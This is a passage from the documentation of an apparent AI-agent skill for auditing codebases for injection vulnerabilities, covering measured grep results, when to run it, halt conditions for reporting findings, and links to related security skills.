- **Measured on a real repo** (a NestJS-on-Fastify monorepo with MikroORM, about 12k files, 2026-10): the earlier grep set returned 1a 325, 2b 510 and the sources grep 1,368 lines, almost all tests, TS migrations, comment prose, i18n JSON and prior audit output; with `X` and `NC` they return 103 (8 shipped), 38 (4 shipped) and 30. The per-lane escape-hatch greps returned 0 beside 64 shipped `em` / `connection` `.execute(` calls until the MikroORM line (46 non-constant hits, 41 shipped); 1e found 19 shipped SQL templates, 11 of which 1a misses because the keyword and `${}` sit on different lines; 13b missed four polynomial regexes that 13c's `recheck` pass flags. On the pack's seeded benchmark fixture all ten injection defects stay in the candidate set and its tagged-`$queryRaw` decoy stays out of it.
- **Measured 2026-10-15 on a real NestJS + React monorepo, offline:** grep 14 went 3 → 0 (all three were toast ids `query-error:${msg}`), 7a 6 → 0 (methods named `template` / `createTemplate` on domain ports), 2a 6 → 1 (the one left is the real `params.sort_by` → column map; the dropped five were browser wire mappers, a `params: [...]` array and `request.body = fields`). 13c could not install recheck: the heuristic printed 52 of 864 extracted regexes, among them the one unanchored quadratic e-mail pattern the audit kept. On `vuln-fullstack` every seeded injection line still prints, and the heuristic alone also lists the seeded ReDoS.

## When to run

- On any diff touching a query, a raw-SQL or query-builder escape hatch, a process spawn, `eval`-family code, a template render, an XML / YAML / serialized-object parse, a deep merge of request JSON, a regex built from input, or a CSV / spreadsheet export — the `/security-audit` dispatch signal.
- On every whole-repo `/security-audit`, reporting all fifteen classes.
- When a feature adds a new entry point that is not an HTTP route — a queue consumer, a webhook, an import job, a model call whose output reaches code (grep 16).

## Halt conditions

- Do not report a critical or high row as confirmed until a verifier other than the run that found it has passed it through [`finding-verification.md`](../../../../snippets/finding-verification.md). Under `/security-audit` that happens in Phase 4; run standalone, it applies the protocol as a separate second pass, tags those rows `self-verified`, and lists the rest as Unconfirmed, Hardening or Refuted — never drops them.
- Halt on any finding without the sink `<file:line>` + the traced source + the concrete fix.
- Do not report a grep hit as a finding. Every row is a hit **plus** a read of the enclosing function **plus** the hops back to a source.
- Do not propose escaping, a deny-list or a WAF rule as the fix where a binding, argv, allow-list or safe-loader API exists.
- Do not print "no injection found" without the class-coverage block; a class whose grep did not run is `blocked`, never `checked`.
- Do not re-derive a class another skill owns (§ Boundaries) — cross-link it.

## Related

- `/security-audit` — dispatches here on its injection signal and folds this skill's class-coverage block into its class ledger; `/security-fix` closes the findings.
- `@security-auditor` — § "A05 Injection (incl. XSS)" and § "A08 Software or Data Integrity Failures" are the surface rows; this skill is the executor behind them.
- `@api-security-reviewer` — § "API3 — Broken Object Property Level Authorization (BOPLA)" owns mass assignment; § "GraphQL (if the API exposes a GraphQL endpoint)" owns GraphQL limits.
- `@llm-security-reviewer` — § "LLM10 Improper Output Handling" owns the model-output trust judgment; sinks it reaches are reported here.
- `ssrf-scan`, `xss-scan`, `file-access-scan`, `data-exposure-scan`, `deps-audit` — the neighbouring classes (§ Boundaries). `sast-scan` — a semgrep / bandit / gosec / brakeman hit in an injection class is a candidate for the matching detector here, triaged by the same read-the-function rule.
- `rules/security-principles.md` — § "Must" (parameterized queries and the identifier carve-out) and § "Must not" (no dynamic evaluation, no shell interpolation of input).
- `backend/ai-patterns/request-validation.md` — § "Mass-assignment / over-posting — the allow-list", when the backend pack is installed; without it, `@api-security-reviewer`'s API3 row carries the same rule.
